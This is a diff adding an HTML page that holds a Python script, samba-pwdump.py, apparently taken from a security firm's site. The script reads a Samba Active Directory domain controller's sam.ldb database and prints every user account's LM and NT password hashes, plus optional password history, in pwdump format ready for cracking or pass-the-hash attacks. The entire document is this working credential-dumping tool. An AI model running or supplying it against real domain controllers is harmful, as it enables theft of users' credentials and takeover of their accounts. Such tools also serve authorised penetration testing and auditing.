@@ -1,0 +1,45 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>samba-pwdump.py</title>
+</head><body>#!/usr/bin/env python<br/>
+# from http://files.securusglobal.com/samba-pwdump.py<br/>
+<br/>
+def get_history(attr, r):<br/>
+  hashes = []<br/>
+  if attr in r:<br/>
+    hist = r[attr][0]<br/>
+    for i in range(0, len(hist), 16):<br/>
+      h = hist[i:i+16].encode('hex')<br/>
+      hashes.append(h)<br/>
+  return hashes<br/>
+<br/>
+def get_hash(attr, r):<br/>
+  if attr not in r:<br/>
+    return ''<br/>
+  else:<br/>
+    return r[attr][0].encode('hex')<br/>
+<br/>
+from samba.ndr import ndr_unpack<br/>
+from samba.dcerpc import security<br/>
+from ldb import Ldb<br/>
+from sys import argv, exit<br/>
+<br/>
+if len(argv) not in (2, 3):<br/>
+  print('Usage: %s &lt;path to .ldb&gt; [-history]' % argv[0])<br/>
+  print(<br/>
+    &quot;Exmpl: %s '/var/lib/samba/private/sam.ldb.d/DC=SECURUS,DC=CORP,DC=COM.ldb'&quot; % argv[0])<br/>
+  exit(2)<br/>
+<br/>
+for r in Ldb(argv[1]).search(expression='(objectclass=user)'):<br/>
+  rid = ndr_unpack(security.dom_sid, r['objectSid'][0]).split()[-1]<br/>
+  username = r['sAMAccountName']<br/>
+  lmhash = get_hash('dBCSPwd', r)<br/>
+  nthash = get_hash('unicodePwd', r)<br/>
+  print('%s:%s:%s:%s:::' % (username, rid, lmhash, nthash))<br/>
+  if len(argv) == 3 and argv[2] == '-history':<br/>
+    lmhistory = get_history('lmPwdHistory', r)<br/>
+    nthistory = get_history('ntPwdHistory', r)<br/>
+    for i, (lmhash, nthash) in enumerate(map(lambda l, n: (l, n) if l else ('', n), lmhistory[1:], nthistory[1:])):<br/>
+      print('%s_history%d:%s:%s:%s:::' %<br/>
+         (username, i, rid, lmhash, nthash))</body></html>
